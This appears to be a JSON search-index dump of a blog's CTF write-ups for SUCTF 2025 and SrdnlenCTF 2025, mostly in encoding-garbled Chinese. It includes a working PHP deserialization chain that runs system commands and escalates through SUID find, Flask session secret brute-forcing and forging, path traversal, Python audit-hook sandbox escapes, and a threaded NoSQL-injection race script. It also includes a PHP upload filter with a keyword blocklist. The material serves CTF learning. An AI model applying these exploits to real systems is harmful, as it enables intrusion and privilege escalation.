* @Description: * * Copyright (c) 2025 by Nbc, All Rights Reserved. */ error_reporting(0); function get_extension($filename){ return pathinfo($filename, PATHINFO_EXTENSION); } function check_extension($filename,$path){ $filePath = $path . DIRECTORY_SEPARATOR . $filename; if (is_file($filePath)) { $extension = strtolower(get_extension($filename)); if (!in_array($extension, ['jpg', 'jpeg', 'png', 'gif'])) { if (!unlink($filePath)) { // echo \"Fail to delete file: $filename\\n\"; return false; } else{ // echo \"This file format is not supported:$extension\\n\"; return false; } } else{ return true; } } else{ // echo \"nofile\"; return false; } } function file_rename ($path,$file){ $randomName = md5(uniqid().rand(0, 99999)) . '.' . get_extension($file); $oldPath = $path . DIRECTORY_SEPARATOR . $file; $newPath = $path . DIRECTORY_SEPARATOR . $randomName; if (!rename($oldPath, $newPath)) { unlink($path . DIRECTORY_SEPARATOR . $file); // echo \"Fail to rename file: $file\\n\"; return false; } else{ return true; } } function move_file($path,$basePath){ foreach (glob($path . DIRECTORY_SEPARATOR . '*') as $file) { $destination = $basePath . DIRECTORY_SEPARATOR . basename($file); if (!rename($file, $destination)){ // echo \"Fail to rename file: $file\\n\"; return false; } } return true; } function check_base($fileContent){ $keywords = ['eval', 'base64', 'shell_exec', 'system', 'passthru', 'assert', 'flag', 'exec', 'phar', 'xml', 'DOCTYPE', 'iconv', 'zip', 'file', 'chr', 'hex2bin', 'dir', 'function', 'pcntl_exec', 'array', 'include', 'require', 'call_user_func', 'getallheaders', 'get_defined_vars','info']; $base64_keywords = []; foreach ($keywords as $keyword) { $base64_keywords[] = base64_encode($keyword); } foreach ($base64_keywords as $base64_keyword) { if (strpos($fileContent, $base64_keyword)!== false) { return true; } else{ return false; } } } function check_content($zip){ for ($i = 0; $i \u003c $zip-\u003enumFiles; $i++) { $fileInfo = $zip-\u003estatIndex($i); $fileName = $fileInfo['name']; if (preg_match('/\\.\\.(\\/|\\.|%2e%2e%2f)/i', $fileName)) { return false; } // echo \"Checking file: $fileName\\n\"; $fileContent = $zip-\u003egetFromName($fileName); if (preg_match('/(eval|base64|shell_exec|system|passthru|assert|flag|exec|phar|xml|DOCTYPE|iconv|zip|file|chr|hex2bin|dir|function|pcntl_exec|array|include|require|call_user_func|getallheaders|get_defined_vars|info)/i', $fileContent) || check_base($fileContent)) { // echo \"Don't hack me!\\n\"; return false; } else { continue; } } return true; } function unzip($zipname, $basePath) { $zip = new ZipArchive; if (!file_exists($zipname)) { // echo \"Zip file does not exist\"; return \"zip_not_found\"; } if (!$zip-\u003eopen($zipname)) { // echo \"Fail to open zip file\"; return \"zip_open_failed\"; } if (!check_content($zip)) { return \"malicious_content_detected\"; } $randomDir = 'tmp_'.md5(uniqid().rand(0, 99999)); $path = $basePath . DIRECTORY_SEPARATOR . $randomDir; if (!mkdir($path, 0777, true)) { // echo \"Fail to create directory\"; $zip-\u003eclose(); return \"mkdir_failed\"; } if (!$zip-\u003eextractTo($path)) { // echo \"Fail to extract zip file\"; $zip-\u003eclose(); } else{ for ($i = 0; $i \u003c $zip-\u003enumFiles; $i++) { $fileInfo = $zip-\u003estatIndex($i); $fileName = $fileInfo['name']; if (!check_extension($fileName, $path)) { // echo \"Unsupported file extension\"; continue; } if (!file_rename($path, $fileName)) { // echo \"File rename failed\"; continue; } } } if (!move_file($path, $basePath)) { $zip-\u003eclose(); // echo \"Fail to move file\"; return \"move_failed\"; } rmdir($path); $zip-\u003eclose(); return true; } $uploadDir = __DIR__ . DIRECTORY_SEPARATOR . 'upload/suimages/'; if (!is_dir($uploadDir)) { mkdir($uploadDir, 0777, true); } if (isset($_F","date":"2025-01-24","objectID":"/cybersec/cc76721/:2:1","tags":["CTF"],"title":"SUCTF 2025","uri":"/cybersec/cc76721/"},{"categories":["CTF"],"content":"SU_POP\r0x00 å‚è€ƒèµ„æ–™\rSymfony ååºåˆ—åŒ–é“¾åˆ†æ å‚è€ƒæ–‡ç« ï¼šhttps://forum.butian.net/share/2411 åœ¨ vendor/symfony/finder/Iterator/SortableIterator.php ä¸­å®šä¹‰äº† SortableIterator ç±»ï¼Œå®ç°äº† IteratorAggregate æ¥å£ __construct æ¥å—ä¸€ä¸ªè¿­ä»£å™¨ $iterator ï¼Œæ•´å‹æˆ–å›è°ƒå‡½æ•° $sort ï¼Œä»¥åŠå¸ƒå°”ç±»å‹ $reverseOrder å¦‚æœä¼ å…¥ä¸€ä¸ª callable çš„ $sort ï¼Œå®ƒå°†ä¼šè¢«èµ‹å€¼ç»™ $this-\u003esort é‚£ä¹ˆåœ¨è°ƒç”¨ getIterator() æ—¶ï¼Œå¯¹äºä¸Šè¿°çš„ $sort ï¼Œç”±äºä¸ç­‰äº 1 æˆ– -1 ï¼Œå°†ä¼šè°ƒç”¨ uasort() uasort(array \u0026$array, callable $callback): true uasort() æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ array ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè€Œè¿™ä¸¤ä¸ªå‚æ•°åœ¨æ„é€ æ—¶å¯æŒ‡å®šï¼Œå³å‚æ•°å¯æ§ï¼Œé‚£ä¹ˆå¯ä»¥ä¼ å…¥ call_user_func æ–¹æ³•ï¼Œå®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œ é‚£ä¹ˆä¸‹é¢æ„é€ é“¾å­çš„æ€è·¯æ˜¯å¯»æ‰¾ç±»ä¸­ __toString() ï¼Œ__destruct() ï¼Œ__wakeup() ä¸­ç›´æ¥æˆ–é—´æ¥ä½¿ç”¨ foreach éå†æˆå‘˜å˜é‡çš„éƒ¨åˆ† 0x01 ä»£ç å®¡è®¡\ræ‹¿åˆ°æºç ï¼Œå…ˆæ‰¾ä¸€ä¸‹åˆ©ç”¨ç‚¹ï¼Œçœ‹è·¯ç”± \u003c?php use Cake\\Routing\\Route\\DashedRoute; use Cake\\Routing\\RouteBuilder; return function (RouteBuilder $routes): void { $routes-\u003esetRouteClass(DashedRoute::class); $routes-\u003escope('/', function (RouteBuilder $builder): void { $builder-\u003econnect('/', ['controller' =\u003e 'Pages', 'action' =\u003e 'display', 'home']); $builder-\u003econnect('/pages/*', 'Pages::display'); $builder-\u003eget('/ser', ['controller' =\u003e 'Pages', 'action' =\u003e 'handleSer']); $builder-\u003efallbacks(); }); }; çœ‹èµ·æ¥åˆ©ç”¨ç‚¹åº”è¯¥åœ¨ /ser ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ handleSer public function handleSer() { $ser = $this-\u003erequest-\u003egetQuery('ser'); unserialize(base64_decode($ser)); $this-\u003eset('ser', $ser); $this-\u003eviewBuilder()-\u003esetLayout('ajax'); $this-\u003erender('handle_ser'); } ç¡®å®šäº†åˆ©ç”¨ç‚¹ï¼Œå¹¶ä¸”å‚æ•°æ˜¯ ser ï¼Œä¸‹é¢æ‰¾ååºåˆ—åŒ–çš„å…¥å£ æœç´¢ __destruct ï¼Œæœ€ç»ˆæ‰¾åˆ° /vender/react/promise/src/Internal/RejectedPromise.php çš„ __destruct è§¦å‘äº† __toString ç”±äº $handler = set_rejection_handler(null); æ°¸è¿œè¿”å› null ï¼Œä¸” $this-\u003ehandled å’Œ $this-\u003ereason å‚æ•°å¯æ§ï¼Œæ‰€ä»¥è¿™ä¸ª __toString æ€»ä¼šè§¦å‘ï¼Œä¸‹é¢æ‰¾ __toString æœ‰ä¸¤ä¸ªå¯èƒ½å¯ä»¥åˆ©ç”¨çš„ ç¬¬ä¸€ä¸ªæ˜¯ /vendor/composer/composer/src/Composer/DependencyResolver/Pool.php ï¼Œæ‰¾åˆ°äº† foreach ç¬¬äºŒä¸ªæ˜¯ /vendor/cakephp/cakephp/src/Http/Response.php ï¼Œ stream å¯æ§ 0x02 POP1\rç”±äº packages å¯æ§ï¼Œæ‰€ä»¥é“¾å­æ˜¯ RejectedPromise::__destruct()-\u003ePool::__toString()-\u003eSortableIterator::getIterator() å—ï¼Ÿ ä¸æ˜¯ï¼Œå› ä¸ºé™„ä»¶ç‰ˆæœ¬çš„ SortableIterator ä¸­æŒ‡å®šäº†ï¼š private \\Closure|int $sort; æ‰€ä»¥å¦‚æœå°†å­—ç¬¦ä¸² \"call_user_func\" èµ‹å€¼ç»™ $sort çš„è¯ï¼Œå°†ä¸èƒ½æˆåŠŸåºåˆ—åŒ–/ååºåˆ—åŒ–ï¼Œæ‰€ä»¥å¦å¯»ä»–ç±»ï¼Œæ‰¾ä¸€ä¸ªæœ‰ getIterator() æ–¹æ³•çš„ç±» æœç´¢åˆ°çš„ç¬¬ä¸€ä¸ªå°±æ˜¯ï¼Œæœ€è½»æ¾çš„ä¸€å›ï¼Œ /vendor/cakephp/cakephp/src/Collection/Iterator $this-\u003e_executed å¯æ§ï¼Œçœ‹ä¸€ä¸‹ _execute() æ–¹æ³• protected function _execute(): void { $mapper = $this-\u003e_mapper; foreach ($this-\u003e_data as $key =\u003e $val) { $mapper($val, $key, $this); } if ($this-\u003e_intermediate \u0026\u0026 $this-\u003e_reducer === null) { throw new LogicException('No reducer function was provided'); } $reducer = $this-\u003e_reducer; if ($reducer !== null) { foreach ($this-\u003e_intermediate as $key =\u003e $list) { $reducer($list, $key, $this); } } $this-\u003e_intermediate = []; $this-\u003e_executed = true; } è¿™æ ·çš„è¯ $mapper å’Œ $reducer éƒ½å¯ä»¥ç”¨æ¥æ‰§è¡Œå‘½ä»¤ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨ $mapper æ‰€ä»¥è¦åˆ©ç”¨çš„é“¾å­æ˜¯ RejectedPromise::__destruct()-\u003ePool::__toString()-\u003eMapReduce::_execute() poc å¦‚ä¸‹ \u003c?php namespace React\\Promise\\Internal; use Composer\\DependencyResolver\\Pool; class RejectedPromise { private $reason; private $handled = false; public function __construct() { $this-\u003ereason = new Pool(); } } namespace Composer\\DependencyResolver; use Cake\\Collection\\Iterator\\MapReduce; class Pool { protected $packages = []; public function __construct() { $this-\u003epackages = new MapReduce(); } } namespace Cake\\Collection\\Iterator; class MapReduce { protected bool $_executed = false; protected iterable $_data; protected $_mapper; public function __construct() { $this-\u003e_mapper = \"call_user_func\"; // $cmd = \"ls /\"; // $cmd = \"cat /flag.txt\"; // $cmd = \"find / -perm -u=s -type f 2\u003e/dev/null\"; // $cmd = \"find / -name flag.txt -exec whoami \\;\"; $cmd = \"find / -name flag.txt -exec cat /flag.txt \\;\"; $this-\u003e_data = [$cmd=\u003e\"system\"]; } } namespace React\\Promise\\Internal; echo base64_encode(serialize(new RejectedPromise())); ?\u003e GET /ser?ser=xxxx ï¼Œ ls find ä¹‹ç±»çš„å‘½ä»¤å¯ä»¥æ‰§è¡Œä¸”æœ‰å›æ˜¾ï¼Œä½†æ˜¯ cat /flag.txt æ— å›æ˜¾ï¼Œä¹‹å‰å­¦é•¿æåˆ°è¿‡ suid ææƒï¼ˆä» www-data æåˆ° rootï¼‰ï¼Œè¯•ä¸€ä¸‹èƒ½ä¸èƒ½è¡Œ find / -perm -u=s -type f 2\u003e/dev/null ï¼Œå¯ä»¥çœ‹åˆ° find æœ‰ suid æƒé™ /usr/bin/chsh /usr/bin/find /usr/bin/chfn /usr/bin/su /usr/bin/umount /usr/bin/passwd /usr/bin/mount /usr/bin/newgrp /usr/bin/gpasswd æ‰§è¡Œ find / -name flag.txt -exec whoami \\; ï¼Œè¿”å› root ï¼ŒææƒæˆåŠŸ æ‰§è¡Œ find / -name flag.txt -exec cat /flag.txt \\","date":"2025-01-24","objectID":"/cybersec/cc76721/:2:2","tags":["CTF"],"title":"SUCTF 2025","uri":"/cybersec/cc76721/"},{"categories":["CTF"],"content":"SU_blog\r0x00 ä¿¡æ¯æ”¶é›†\ræ³¨å†Œä¸€ä¸ª admin ç”¨æˆ·ï¼ˆç«Ÿç„¶è®©æ³¨å†Œï¼‰ ç™»é™†åæç¤º md5 + æ—¶é—´æˆ³ ç”Ÿæˆäº† SECRET ç»“åˆ Cookie ä¸­çš„ jwt ï¼Œæ¨æµ‹æ˜¯ jwt çš„ secretkey 0x01 session ä¼ªé€ \rè™½ç„¶å…è®¸æ³¨å†Œ admin ç”¨æˆ·ï¼Œä½†æ˜¯è¿˜æ˜¯ä¼ªé€ ä¸€ä¸‹ session å§ï¼Œwp çœ‹åˆ°æ˜¯éé¢„æœŸ ä¹‹å‰ç”¨çš„æ˜¯ flask-session-cookie-manager ï¼Œä¸èƒ½çˆ†ç ´ï¼Œ å®˜æ–¹ wp ç»™å‡º flask-unsign ï¼Œå·¥å…·++ ç”Ÿæˆå­—å…¸ import time import hashlib wordlist = [] timestamp = int(time.time()) for i in range(timestamp - 1000000, timestamp + 1000000): wordlist.append(hashlib.md5(str(i).encode()).hexdigest()) with open(\"/home/mingzu/CTF/wordlist.txt\", \"w\") as f: for word in wordlist: f.write(word + \"\\n\") \u003e flask-unsign -u -c \"eyJ1c2VybmFtZSI6Im1pbmd6dSJ9.Z5UV3g.v4iJ--zejF0WE-AetwuuqaYPy-A\" --wordlist wordlist.txt --no-literal-eval [*] Session decodes to: {'username': 'mingzu'} [*] Starting brute-forcer with 8 threads.. [+] Found secret key after 996480 attempts2acb53068c17 b'c78e2cbce1051488f1f616939660a68d' çˆ†ç ´å‡º secret ï¼Œä¼ªé€  session \u003e flask-unsign -s -c \"{'username': 'admin'}\" --secret 'c78e2cbce1051488f1f616939660a68d' eyJ1c2VybmFtZSI6ImFkbWluIn0.Z5UfEw.PWO_FglQqS-u7lTOfsl_BCMEzeE 0x02 è·å–æºç \rç‚¹å¼€ article ï¼ŒGET /article?file= çš„å½¢å¼æ„Ÿè§‰æ˜¯æ–‡ä»¶åŒ…å«ï¼Œè¯» articles/../articles/article1.txt æç¤ºæ–‡ä»¶æœªæ‰¾åˆ°ï¼Œå°è¯•åŒå†™ç»•è¿‡ï¼Œè·¯å¾„æ­£ç¡® è¯» /etc/passwd ç¡®å®šç›¸å¯¹è·¯å¾„ è¯» /flag è¿”å›è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ï¼Œä¸è®©ç›´æ¥è¯» GET /article?file=articles/..././app.py æ‹¿åˆ° app.py from flask import * import time,os,json,hashlib from pydash import set_ from waf import pwaf,cwaf app = Flask(__name__) app.config['SECRET_KEY'] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\"testuser\": \"password\"} BASE_DIR = '/var/www/html/myblog/app' articles = { 1: \"articles/article1.txt\", 2: \"articles/article2.txt\", 3: \"articles/article3.txt\" } friend_links = [ {\"name\": \"bkf1sh\", \"url\": \"https://ctf.org.cn/\"}, {\"name\": \"fushuling\", \"url\": \"https://fushuling.com/\"}, {\"name\": \"yulate\", \"url\": \"https://www.yulate.com/\"}, {\"name\": \"zimablue\", \"url\": \"https://www.zimablue.life/\"}, {\"name\": \"baozongwi\", \"url\": \"https://baozongwi.xyz/\"}, ] class User(): def __init__(self): pass user_data = User() @app.route('/') def index(): if 'username' in session: return render_template('blog.html', articles=articles, friend_links=friend_links) return redirect(url_for('login')) @app.route('/login', methods=['GET', 'POST']) def login(): if request.method == 'POST': username = request.form['username'] password = request.form['password'] if username in users and users[username] == password: session['username'] = username return redirect(url_for('index')) else: return \"Invalid credentials\", 403 return render_template('login.html') @app.route('/register', methods=['GET', 'POST']) def register(): if request.method == 'POST': username = request.form['username'] password = request.form['password'] users[username] = password return redirect(url_for('login')) return render_template('register.html') @app.route('/change_password', methods=['GET', 'POST']) def change_password(): if 'username' not in session: return redirect(url_for('login')) if request.method == 'POST': old_password = request.form['old_password'] new_password = request.form['new_password'] confirm_password = request.form['confirm_password'] if users[session['username']] != old_password: flash(\"Old password is incorrect\", \"error\") elif new_password != confirm_password: flash(\"New passwords do not match\", \"error\") else: users[session['username']] = new_password flash(\"Password changed successfully\", \"success\") return redirect(url_for('index')) return render_template('change_password.html') @app.route('/friendlinks') def friendlinks(): if 'username' not in session or session['username'] != 'admin': return redirect(url_for('login')) return render_template('friendlinks.html', links=friend_links) @app.route('/add_friendlink', methods=['POST']) def add_friendlink(): if 'username' not in session or session['username'] != 'admin': return redirect(url_for('login')) name = request.form.get('name') url = request.form.get('url') if name and url: friend_links.append({\"name\": name, \"url\": url}) return redirect(url_for('friendlinks')) @app.route('/delete_friendlink/\u003cint:index\u003e') def delete_frien","date":"2025-01-24","objectID":"/cybersec/cc76721/:2:3","tags":["CTF"],"title":"SUCTF 2025","uri":"/cybersec/cc76721/"},{"categories":["CTF"],"content":"SU_easyk8s\rk8s ç”¨éƒ½æ²¡ç”¨è¿‡ï¼Œä¸€ç‚¹å¤´çŒªæ²¡æœ‰ï¼Œä¹Ÿæ²¡æœåˆ°å¤ªå¤šæœ‰ç”¨çš„ä¸œè¥¿ï¼Œç›´æ¥çœ‹ wp å§ 0x00 Python Audit Hook RCE\rä»€ä¹ˆç©æ„ï¼Œæ²¡å¬è¯´è¿‡ï¼ŒæŸ¥ï¼šhttps://xz.aliyun.com/news/15665 Audit Hook æ˜¯ python 3.8 ä¸­å¼•å…¥çš„ç‰¹æ€§ï¼Œä½¿ç”¨å®¡è®¡ç‹—å­æ¥ç›‘æ§å’Œè®°å½•ç¨‹åºè¿è¡Œè¡Œä¸ºï¼Œç‰¹åˆ«æ˜¯å®‰å…¨æ•æ„Ÿè¡Œä¸ºï¼Œå¦‚æ–‡ä»¶è¯»å†™ã€ç½‘ç»œé€šä¿¡å’ŒåŠ¨æ€ä»£ç æ‰§è¡Œç­‰ å®¡è®¡äº‹ä»¶åŒ…æ‹¬ä½†ä¸é™äºï¼š import : å¯¼å…¥æ¨¡å— open : æ‰“å¼€æ–‡ä»¶ exec : æ‰§è¡Œä»£ç  compile : ç¼–è¯‘ä»£ç  socket : åˆ›å»ºæˆ–ä½¿ç”¨å¥—æ¥å­— os.system ï¼Œ os.popen ç­‰ : æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ subprocess.popen ï¼Œ subprocess.run ç­‰ : å¯åŠ¨å­è¿›ç¨‹ ç­‰ç­‰ è¿™ç§ pyjail è¦ rce æŸ¥äº†æŸ¥æœ‰å¥½å¤šç§æ–¹æ³• DEBUG = True import os, sys origin_print = print def print(*args): # original_print(sys._getframe(1).f_locals) t = sys._getframe(1).f_locals['audit_functions'] t['os.system']['ban'] = False # origin_print(t) return origin_print(*args) os.system('ls') ç¬¬ä¸€æ¬¡è§ï¼Œé•¿è§è¯†äº†ï¼Œå…ˆæŠŠåŸç”Ÿ print ä¿å­˜ä¸º origin_print ï¼Œç„¶åé‡å†™ print è®¿é—®è°ƒç”¨æ ˆä¸Šä¸€çº§å‡½æ•°çš„å±€éƒ¨å˜é‡ï¼Œè¿™é‡Œè°ƒç”¨çš„æ˜¯ os.system çš„å±€éƒ¨å˜é‡ 1 æ˜¯ä¸Šä¸€çº§å¸§ï¼Œ0 æ˜¯å½“å‰å¸§ï¼Œä¾æ­¤ç±»æ¨ t = sys._getframe(1).f_locals # {'event': 'os.system', 'args': (b'ls',), 'audit_functions': {'os.system': {'ban': False}, ... }} ä¿®æ”¹ audit_functions å­—å…¸ï¼Œ/pardon os.system ï¼ˆä»€ä¹ˆæ–¹å—äººï¼‰ ç„¶åç»§ç»­æ‰§è¡Œ print(*args) ï¼Œè¿™æ ·å°±å®ç°äº† rce æˆ–è€… å¯ä»¥ç”¨ _posixsubprocess.fork_exec posixsubprocess æ˜¯å†…éƒ¨æ¨¡å—ï¼Œæ ¸å¿ƒåŠŸèƒ½æ˜¯ fork_exec å‡½æ•°ï¼Œæä¾›äº†ä¸€ä¸ªéå¸¸åº•å±‚çš„æ–¹å¼åˆ›å»ºå­è¿›ç¨‹ï¼Œå¹¶åœ¨å­è¿›ç¨‹ä¸­æ‰§è¡ŒæŒ‡å®šç¨‹åº import os import _posixsubprocess cmd = b\"/bin/ls\" param = \".\" _posixsubprocess.fork_exec([cmd, param], [cmd], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False) ç½‘ä¸Šæœæ¥çš„ï¼Œä¸€å †å‚æ•°ä¸€çœ¼çœ‹ä¸æ˜ç™½ï¼ŒæŸ¥æŸ¥æºç ï¼Œæ¯ä¸ªç‰ˆæœ¬ä¹‹é—´å¯èƒ½æœ‰å·®å¼‚ # _posixsubprocess.py def fork_exec(*args, **kwargs): # real signature unknown \"\"\" Spawn a fresh new child process. Fork a child process, close parent file descriptors as appropriate in the child and duplicate the few that are needed before calling exec() in the child process. If close_fds is True, close file descriptors 3 and higher, except those listed in the sorted tuple pass_fds. The preexec_fn, if supplied, will be called immediately before closing file descriptors and exec. WARNING: preexec_fn is NOT SAFE if your application uses threads. It may trigger infrequent, difficult to debug deadlocks. If an error occurs in the child process before the exec, it is serialized and written to the errpipe_write fd per subprocess.py. Returns: the child process's PID. Raises: Only on an error in the parent process. \"\"\" pass # _posixsubprocess.pyi def fork_exec( args: Sequence[StrOrBytesPath] | None, executable_list: Sequence[bytes], close_fds: bool, pass_fds: tuple[int, ...], cwd: str, env: Sequence[bytes] | None, p2cread: int, p2cwrite: int, c2pread: int, c2pwrite: int, errread: int, errwrite: int, errpipe_read: int, errpipe_write: int, restore_signals: int, call_setsid: int, pgid_to_set: int, gid: SupportsIndex | None, extra_groups: list[int] | None, uid: SupportsIndex | None, child_umask: int, preexec_fn: Callable[[], None], allow_vfork: bool, /, ) -\u003e int: ... å¯¹åº”èµ·æ¥ï¼š Sequence[StrOrBytesPath] | None = [cmd, param] executable_list: Sequence[bytes] = [cmd] close_fds: bool = True pass_fds: tuple[int, ...] = () cwd: str = None env: Sequence[bytes] | None = None p2cread: int = -1 p2cwrite: int = -1 c2pread: int = -1 c2pwrite: int = -1 errread: int = -1 errwrite: int = -1 errpipe_read: int = *(os.pipe())[0] errpipe_write: int = *(os.pipe())[1] restore_signals: int = False call_setsid: int = False pgid_to_set: int = False gid: SupportsIndex | None = None extra_groups: list[int] | None = None uid: SupportsIndex | None = None child_umask: int = -1 preexec_fn: Callable[[], None] = None allow_vfork: bool = False æŠŠæ— æ•ˆçš„é…ç½®å»æ‰ï¼Œå¾—åˆ° Sequence[StrOrBytesPath] | None = [cmd, param] # å‘½ä»¤åŠå‚æ•° executable_list: Sequence[bytes] = [cmd] # å‘½ä»¤è·¯å¾„ # os.pipe()åˆ›å»ºä¸€ä¸ª pipe ï¼Œè¿”å›ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦ errpipe_read: int = *(os.pipe())[0] errpipe_write: int = *(os.pipe())[1] è¿™æ ·ä¹Ÿèƒ½å®ç° rce 0x01 k8s ä¿¡æ¯æ³„æ¼\rwp è¯´ç”¨ k8spiderï¼šhttps://github.com/Esonhugh/k8spider ç¯å¢ƒæ²¡é…å¥½ï¼Œk8s ä¹‹åå†è¯´ ","date":"2025-01-24","objectID":"/cybersec/cc76721/:2:4","tags":["CTF"],"title":"SUCTF 2025","uri":"/cybersec/cc76721/"},{"categories":["CTF"],"content":"srdnlen\r","date":"2025-01-23","objectID":"/cybersec/4f8b201/:1:0","tags":["CTF"],"title":"SrdnlenCTF 2025","uri":"/cybersec/4f8b201/"},{"categories":["CTF"],"content":"web\r","date":"2025-01-23","objectID":"/cybersec/4f8b201/:2:0","tags":["CTF"],"title":"SrdnlenCTF 2025","uri":"/cybersec/4f8b201/"},{"categories":["CTF"],"content":"Ben 10\ré¢˜ç›®æè¿°è¯´ Ben 10 æœ‰å¥½ä¸œè¥¿ï¼Œä½†æ˜¯æ³¨å†Œè´¦å·åå‘ç°ä¸è®©è®¿é—® é™„ä»¶ä¸­çš„ app.py ç»™å‡ºäº† app.secret_key = â€˜your_secret_keyâ€™ æŠŠ jwt ç”¨ flask-session-cookie-manager è§£å¯†ï¼Œå‘ç°åªæœ‰ username ä» app.py ä¸­å¯ä»¥çœ‹åˆ°æ³¨å†Œç”¨æˆ·æ—¶ä¹Ÿä¸€èµ·æ³¨å†Œäº†ä¸€ä¸ªå¯¹åº”çš„ admin ç”¨æˆ· @app.route('/register', methods=['GET', 'POST']) def register(): admin_username = f\"admin^{username}^{secrets.token_hex(5)}\" cursor.execute(\"INSERT INTO users (username, password, admin_username) VALUES (?, ?, ?)\", (admin_username, admin_password, None)) conn.commit() è€Œ admin_username åœ¨ /home ä¸­æ˜¾ç¤º æ‰€ä»¥è¿›è¡Œ session ä¼ªé€  GET /image/ben10 ï¼Œæ‹¿åˆ° flag srdnlen{b3n_l0v3s_br0k3n_4cc355_c0ntr0l_vulns} ","date":"2025-01-23","objectID":"/cybersec/4f8b201/:2:1","tags":["CTF"],"title":"SrdnlenCTF 2025","uri":"/cybersec/4f8b201/"},{"categories":["CTF"],"content":"Focus. Speed. I am speed.\rç¾¤é‡Œå¸ˆå‚…è¯´æ‰“ nosql + ç«äº‰ï¼Œé‚£æˆ‘å°±ç…§ç€æ‰“äº†qwq åº”è¯¥è¦ä¹°ç¬¬4ä¸ªï¼Œ50 points ç½‘é¡µéƒ½è®¿é—®ä¸€éï¼Œå‘ç°åœ¨ GET /redeem?discountCode=xxx æœ‰æŸ¥è¯¢ ç¿»ä¸€ä¸‹ä»£ç ï¼Œé¡ºç€æ‰¾åˆ°ï¼š routes.js const discount = await DiscountCodes.findOne({discountCode}) discountCodes.js const DiscountCodeSchema = new mongoose.Schema({ discountCode: { type: String, default: null, // Optional field for discount codes }, value: { type: Number, default: 10 } }) module.exports = mongoose.model('DiscountCodes', DiscountCodeSchema) æ³¨ä¸€ä¸‹è¯•è¯•çœ‹ï¼Œç¡®å®å¯ä»¥ ä½†æ˜¯ç¤¼å“å¡è¯´æ˜¯ä¸€å¤©åªèƒ½å…‘æ¢ä¸€æ¬¡ï¼Œæ‰¾ä»£ç  routes.js // Check if the voucher has already been redeemed today const today = new Date(); const lastRedemption = user.lastVoucherRedemption; if (lastRedemption) { const isSameDay = lastRedemption.getFullYear() === today.getFullYear() \u0026\u0026 lastRedemption.getMonth() === today.getMonth() \u0026\u0026 lastRedemption.getDate() === today.getDate(); if (isSameDay) { return res.json({success: false, message: 'You have already redeemed your gift card today!' }); } } // Apply the gift card value to the user's balance const { Balance } = await User.findById(req.user.userId).select('Balance'); user.Balance = Balance + discount.value; // Introduce a slight delay to ensure proper logging of the transaction // and prevent potential database write collisions in high-load scenarios. new Promise(resolve =\u003e setTimeout(resolve, delay * 1000)); user.lastVoucherRedemption = today; await user.save(); åœ¨ä¿å­˜ä¹‹å‰ï¼ŒsetTimeout(delay * 1000 ms)ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡å¹¶å‘è¯·æ±‚è®¿é—® balance æ¥åˆ¶é€ ç«äº‰æ¡ä»¶ ä¸€ç›´ buy ç¬¬ä¸€è¾†ğŸš—ï¼Œç„¶åé‡å¤å…‘æ¢ç¤¼å“å¡ import time import requests import threading import json url = \"http://speed.challs.srdnlen.it:8082\" # è´¦å·æ³¨å†Œ url_register = f\"{url}/register-user\" data_user = {\"username\": \"mingzuxxxxxxxxxxxxxxx\", \"password\": \"123\"} try: response = requests.post(url_register, json=data_user) jwt = response.headers[\"Set-Cookie\"].split(\";\")[0].split(\"=\")[1] print(jwt) except Exception as e: print(e) # ç«äº‰ url_store = f\"{url}/store\" headers = {'Cookie': f'jwt={jwt}',} data_buy = {\"productId\": 1} def send_request(): try: response = requests.post(url_store, headers=headers, json=data_buy) # print(f\"Status Code: {response.status_code}, Response Text: {response.text}\") except Exception as e: print(f\"Request failed: {e}\") def send_requests(): while True: send_request() def race(thread_num): threads = [] for _ in range(thread_num): thread = threading.Thread(target=send_requests) threads.append(thread) thread.start() for thread in threads: thread.join() # å·ç‚¹æ•° url_redeem = f\"{url}/redeem?discountCode[$ne]=1\" def steal_points(): while True: try: response = requests.get(url_redeem, headers=headers) # print(f\"Status Code: {response.status_code}, Response Text: {response.text}\") if json.loads(response.text)[\"success\"]: print(f\"Steal Points Successfully: {json.loads(response.text)[\"message\"]}\") except Exception as e: print(f\"Request failed: {e}\") def steal_points_rapidly(thread_num): threads = [] for _ in range(thread_num): thread = threading.Thread(target=steal_points) threads.append(thread) thread.start() for thread in threads: thread.join() # steal_points() # æ‰§è¡Œ def execute(): thread_race = threading.Thread(target=race, args=(100,)) thread_steal = threading.Thread(target=steal_points_rapidly, args=(100,)) thread_race.start() time.sleep(1) thread_steal.start() execute() æ‹¿åˆ° 60 points ï¼Œä¹°åˆ°è¾£ srdnlen{6peed_1s_My_0nly_Competition} ","date":"2025-01-23","objectID":"/cybersec/4f8b201/:2:2","tags":["CTF"],"title":"SrdnlenCTF 2025","uri":"/cybersec/4f8b201/"}]